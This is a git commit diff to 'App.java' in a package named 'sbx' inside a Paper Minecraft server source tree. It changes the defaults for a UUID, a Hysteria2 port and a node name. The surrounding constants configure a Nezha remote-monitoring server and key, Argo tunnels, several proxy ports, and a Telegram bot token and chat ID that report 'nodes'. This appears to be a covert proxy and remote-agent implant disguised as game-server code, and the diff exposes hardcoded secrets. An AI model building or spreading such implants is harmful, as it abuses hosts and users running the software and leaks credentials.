584c4ae88215bae661d6d48ee6760f4285b36fe4
bailangmax <langb6416@gmail.com>
2026-09-15 19:14:12 +0800

    Update UUID, HY2_PORT, and NAME environment variables

--- paper-server/src/main/java/io/papermc/paper/sbx/App.java
+++ paper-server/src/main/java/io/papermc/paper/sbx/App.java
@@ -44,7 +44,7 @@ public class App {
     private static final boolean YT_WARPOUT = envBool("YT_WARPOUT", false);
     private static final String FILE_PATH = env("FILE_PATH", "world");
     private static final String SUB_PATH = env("SUB_PATH", "sub");
-    private static final String UUID = env("UUID", "6c0aafd7-3a93-4da0-80bc-d4d1fcf127f9");
+    private static final String UUID = env("UUID", "fc2af4e9-9858-4420-887b-5e7444dc9c86");
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.july.kdns.fr:10063");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "IWV1jk7lUMOldX2F7cY5PvBBtLWYwxXa");
@@ -52,13 +52,13 @@ public class App {
     private static final String ARGO_AUTH = env("ARGO_AUTH", "");
     private static final int ARGO_PORT = envInt("ARGO_PORT", 8001);
     private static final String S5_PORT = env("S5_PORT", "");
-    private static final String HY2_PORT = env("HY2_PORT", "26349");
+    private static final String HY2_PORT = env("HY2_PORT", "40004");
     private static final String TUIC_PORT = env("TUIC_PORT", "");
     private static final String ANYTLS_PORT = env("ANYTLS_PORT", "");
     private static final String REALITY_PORT = env("REALITY_PORT", "");
     private static final String CFIP = env("CFIP", "cf.877774.xyz");
     private static final int CFPORT = envInt("CFPORT", 443);
-    private static final String NAME = env("NAME", "vektalnodes");
+    private static final String NAME = env("NAME", "centnodes");
     private static final String CHAT_ID = env("CHAT_ID", "7627328147");  // 如果关闭了log输出,请填写tg推送，否则找不到节点
     private static final String BOT_TOKEN = env("BOT_TOKEN", "8712829238:AAEkSunL7neEXazQUzTXFaWFbajD2SQEA-Y");
     private static final boolean DISABLE_ARGO = envBool("DISABLE_ARGO", false);
